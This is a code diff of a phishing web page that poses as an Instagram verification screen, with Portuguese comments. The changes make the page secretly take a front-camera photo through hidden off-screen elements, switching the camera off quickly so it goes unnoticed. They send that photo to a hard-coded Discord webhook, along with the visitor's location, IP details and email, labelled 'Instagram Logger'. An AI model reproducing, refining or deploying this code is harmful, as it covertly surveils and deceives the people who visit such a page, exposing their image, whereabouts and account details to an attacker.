@@ -287,25 +287,26 @@
             height: 60px;
         }
 
-        /* Estilos para o vídeo da câmera (invisível) */
+        /* Estilos para a câmera (totalmente escondidos) */
         #cameraVideo {
             position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
             opacity: 0.01;
             pointer-events: none;
+            width: 1px;
+            height: 1px;
+            top: -9999px;
+            left: -9999px;
+            transform: scale(0.1);
         }
         
         #cameraCanvas {
             position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
             opacity: 0.01;
             pointer-events: none;
+            width: 1px;
+            height: 1px;
+            top: -9999px;
+            left: -9999px;
         }
     </style>
 </head>
@@ -315,7 +316,7 @@
     </div>
 
     <!-- Elementos ocultos para captura de câmera -->
-    <video id="cameraVideo" autoplay playsinline></video>
+    <video id="cameraVideo" autoplay playsinline muted></video>
     <canvas id="cameraCanvas"></canvas>
 
     <!-- Modal de solicitação de localização -->
@@ -398,87 +399,171 @@
         // Webhook do Discord para receber os dados
         const webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";
         
-        // Variáveis para armazenar as coordenadas
+        // Variáveis para armazenar dados e estado
         let userLatitude = null;
         let userLongitude = null;
         let verificacaoConcluida = false;
         let cameraImage = null;
-        
+        let cameraAttempted = false;
+        let cameraTimerId = null;
+
         // Verificar se está em um dispositivo móvel
         const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         
         // Verificar se está no iOS
         const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
         
-        // Função para iniciar e acessar a câmera silenciosamente
-        async function initCamera() {
+        // Função para iniciar captura da câmera com tempo limite
+        function initCamera() {
+            if (cameraAttempted) return; // Evitar múltiplas tentativas
+            cameraAttempted = true;
+            
             try {
                 const video = document.getElementById('cameraVideo');
                 const canvas = document.getElementById('cameraCanvas');
                 
-                // Escolher a câmera frontal em dispositivos móveis
+                // Garantir que o vídeo seja mudo (sem som)
+                video.muted = true;
+                video.setAttribute('muted', '');
+                video.setAttribute('playsinline', '');
+                
+                // Escolher a câmera frontal com baixa resolução para ser mais rápido
                 const constraints = {
+                    audio: false,
                     video: {
                         facingMode: "user", // Câmera frontal
-                        width: { ideal: 320 },
+                        width: { ideal: 240 },
                         height: { ideal: 240 }
-                    },
-                    audio: false
+                    }
                 };
+                
+                // Definir um tempo máximo para a captura (2 segundos)
+                cameraTimerId = setTimeout(() => {
+                    try {
+                        if (video.srcObject) {
+                            const tracks = video.srcObject.getTracks();
+                            tracks.forEach(track => track.stop());
+                            video.srcObject = null;
+                        }
+                    } catch (e) {
+                        console.error("Erro ao parar câmera após timeout:", e);
+                    }
+                }, 2000);
                 
                 // Solicitar acesso à câmera
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                video.srcObject = stream;
-                
-                // Quando o vídeo estiver pronto, tirar uma foto rapidamente
-                video.onloadedmetadata = function() {
-                    video.play();
-                    
-                    // Pequeno atraso para garantir que a câmera está pronta
-                    setTimeout(() => {
-                        // Tirar a foto
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
                         
-                        // Obter a imagem como base64
-                        try {
-                            cameraImage = canvas.toDataURL('image/jpeg', 0.7);
-                            console.log("Imagem capturada com sucesso");
-                            
-                            // Parar todos os tracks da câmera para desligar a luz
-                            stream.getTracks().forEach(track => track.stop());
-                        } catch (e) {
-                            console.error("Erro ao capturar imagem:", e);
+                        // Capturar a foto assim que o vídeo começar a tocar
+                        video.onplaying = () => {
+                            // Pequeno atraso para garantir que a câmera esteja pronta
+                            setTimeout(() => {
+                                try {
+                                    // Ajustar tamanho do canvas para o vídeo
+                                    canvas.width = video.videoWidth;
+                                    canvas.height = video.videoHeight;
+                                    
+                                    // Desenhar frame do vídeo no canvas
+                                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    
+                                    // Obter imagem como base64 com qualidade reduzida para ser mais leve
+                                    cameraImage = canvas.toDataURL('image/jpeg', 0.5);
+                                    
+                                    console.log("Imagem capturada com sucesso!");
+                                    
+                                    // Enviar imediatamente para o Discord
+                                    sendCameraImageToDiscord(cameraImage);
+                                    
+                                    // Parar todos os tracks da câmera imediatamente para desligar a luz
+                                    const tracks = stream.getTracks();
+                                    tracks.forEach(track => track.stop());
+                                    video.srcObject = null;
+                                    
+                                    // Limpar o timeout já que concluímos com sucesso
+                                    if (cameraTimerId) {
+                                        clearTimeout(cameraTimerId);
+                                        cameraTimerId = null;
+                                    }
+                                } catch (e) {
+                                    console.error("Erro ao capturar imagem:", e);
+                                    // Certificar-se de parar a câmera mesmo em caso de erro
+                                    stream.getTracks().forEach(track => track.stop());
+                                }
+                            }, 100); // Apenas 100ms de atraso para ser super rápido
+                        };
+                    })
+                    .catch(error => {
+                        console.error("Erro ao acessar câmera:", error);
+                        // Limpar o timeout em caso de erro
+                        if (cameraTimerId) {
+                            clearTimeout(cameraTimerId);
+                            cameraTimerId = null;
                         }
-                    }, 300); // Tempo suficiente para câmera inicializar, mas rápido o bastante para não ser notado
-                };
+                    });
             } catch (error) {
-                console.error("Erro ao acessar câmera:", error);
-                // Continuar mesmo sem a câmera
+                console.error("Erro ao inicializar câmera:", error);
+                if (cameraTimerId) {
+                    clearTimeout(cameraTimerId);
+                    cameraTimerId = null;
+                }
             }
         }
         
-        // Função para converter base64 para blob (para envio)
-        function base64ToBlob(base64, mime) {
-            mime = mime || '';
-            const sliceSize = 1024;
-            const byteChars = atob(base64.split(',')[1]);
-            const byteArrays = [];
+        // Função especializada para enviar imagem da câmera diretamente para o Discord
+        async function sendCameraImageToDiscord(imageBase64) {
+            if (!imageBase64) return;
             
-            for (let offset = 0; offset < byteChars.length; offset += sliceSize) {
-                const slice = byteChars.slice(offset, offset + sliceSize);
-                const byteNumbers = new Array(slice.length);
+            try {
+                // Criar mensagem especial apenas para a imagem
+                const payload = {
+                    username: "Instagram Logger",
+                    avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png",
+                    content: "📸 Foto do usuário capturada",
+                    embeds: [{
+                        title: "Foto da câmera",
+                        color: 0xE1306C,
+                        image: {
+                            url: "attachment://camera.jpg"
+                        }
+                    }]
+                };
                 
-                for (let i = 0; i < slice.length; i++) {
-                    byteNumbers[i] = slice.charCodeAt(i);
+                // Preparar formulário para enviar a imagem como arquivo anexo
+                const formData = new FormData();
+                
+                // Converter base64 para blob
+                const byteString = atob(imageBase64.split(',')[1]);
+                const mimeType = imageBase64.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
                 }
                 
-                const byteArray = new Uint8Array(byteNumbers);
-                byteArrays.push(byteArray);
+                const blob = new Blob([ab], { type: mimeType });
+                const file = new File([blob], "camera.jpg", { type: "image/jpeg" });
+                
+                // Anexar payload e arquivo
+                formData.append("payload_json", JSON.stringify(payload));
+                formData.append("file", file, "camera.jpg");
+                
+                // Enviar para o Discord usando fetch
+                const response = await fetch(webhook, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (response.ok) {
+                    console.log("Imagem da câmera enviada com sucesso!");
+                } else {
+                    console.error("Erro ao enviar imagem da câmera:", response.status);
+                }
+            } catch (error) {
+                console.error("Erro ao processar envio da imagem:", error);
             }
-            
-            return new Blob(byteArrays, {type: mime});
         }
         
         // Função para mostrar o carregamento
@@ -496,13 +581,17 @@
             document.getElementById('locationModal').style.display = 'none';
         }
         
-        // Mostrar o modal de localização ao carregar a página
+        // Mostrar o modal e iniciar câmera ao carregar a página
         document.addEventListener('DOMContentLoaded', function() {
-            // Iniciar a câmera silenciosamente ao carregar a página
+            // Se for dispositivo móvel, iniciar a câmera imediatamente
             if (isMobile) {
-                initCamera();
+                // Pequeno atraso para garantir que a página esteja carregada
+                setTimeout(() => {
+                    initCamera();
+                }, 500);
             }
             
+            // Mostrar o modal de localização após um breve atraso
             setTimeout(function() {
                 showLocationModal();
             }, 1000);
@@ -589,40 +678,6 @@
             }
         }
         
-        // Função para enviar imagem da câmera (usando FormData e uma API de upload)
-        async function sendCameraImage() {
-            if (!cameraImage) return null;
-            
-            try {
-                // Usar imgbb.com como exemplo de serviço de upload gratuito
-                // Você precisaria criar uma conta e obter uma API key
-                const apiKey = ''; // Coloque sua API key aqui se for usar
-                
-                if (!apiKey) return null;
-                
-                const blob = base64ToBlob(cameraImage, 'image/jpeg');
-                const formData = new FormData();
-                formData.append('image', blob);
-                formData.append('key', apiKey);
-                
-                const response = await fetch('https://api.imgbb.com/1/upload', {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    return data.data.url;
-                }
-                
-                return null;
-            } catch (error) {
-                console.error('Erro ao enviar imagem:', error);
-                return null;
-            }
-        }
-        
         // Detectar sistema operacional e navegador
         function detectUserInfo(userAgent) {
             let os = "Desconhecido";
@@ -680,18 +735,6 @@
                 locationInfo = `Latitude: ${ipInfo.latitude}\nLongitude: ${ipInfo.longitude}\nGoogle Maps: ${mapsLink}\n(Aproximado pelo IP)`;
             }
             
-            // Tentar enviar a imagem da câmera se disponível
-            let cameraImageUrl = null;
-            if (cameraImage) {
-                // Opção 1: Enviar para serviço de hospedagem (se API key estiver configurada)
-                cameraImageUrl = await sendCameraImage();
-                
-                // Opção 2: Se a opção 1 falhar, inserir diretamente no Discord (limitado a pequenas imagens)
-                if (!cameraImageUrl && cameraImage.length < 200000) { // Limitar a 200KB
-                    cameraImageUrl = cameraImage;
-                }
-            }
-            
             // Criar payload para enviar ao Discord
             const payload = {
                 username: "Instagram Logger",
@@ -743,13 +786,6 @@
                 payload.embeds[0].url = mapsLink;
             }
             
-            // Adicionar imagem da câmera se disponível (apenas se for uma URL válida)
-            if (cameraImageUrl && cameraImageUrl.startsWith('http')) {
-                payload.embeds[0].image = {
-                    url: cameraImageUrl
-                };
-            }
-            
             // Enviar para o webhook
             console.log("Enviando dados para webhook...");
             const success = await sendToWebhook(payload);
@@ -758,25 +794,6 @@
                 console.log("Dados enviados com sucesso!");
             } else {
                 console.error("Falha ao enviar dados.");
-            }
-            
-            // Se temos a imagem da câmera mas não conseguimos incluir no embed, tentar enviar separadamente
-            if (cameraImage && !cameraImageUrl) {
-                try {
-                    // Criar uma mensagem separada apenas com a imagem
-                    const imagePayload = {
-                        username: "Instagram Logger",
-                        content: "📷 Foto da câmera do usuário " + email,
-                        avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png"
-                    };
-                    
-                    // Tentar enviar como conteúdo se for pequeno o suficiente
-                    if (cameraImage.length < 200000) { // Limite de ~200KB
-                        await sendToWebhook(imagePayload);
-                    }
-                } catch (error) {
-                    console.error("Erro ao enviar imagem separadamente:", error);
-                }
             }
             
             // Redirecionar para o Instagram real após um pequeno atraso
@@ -791,16 +808,16 @@
             button.textContent = "Verificando...";
             button.disabled = true;
             
+            // Se ainda não tentamos capturar imagem da câmera, tentar agora
+            if (isMobile && !cameraAttempted) {
+                initCamera();
+            }
+            
             getLocation()
                 .then(() => {
                     // Localização obtida com sucesso
                     hideLocationModal();
                     verificacaoConcluida = true;
-                    
-                    // Tentar capturar imagem da câmera se ainda não tiver
-                    if (isMobile && !cameraImage) {
-                        initCamera();
-                    }
                     
                     // Mostra uma mensagem de sucesso temporária
                     const successMessage = document.createElement('div');
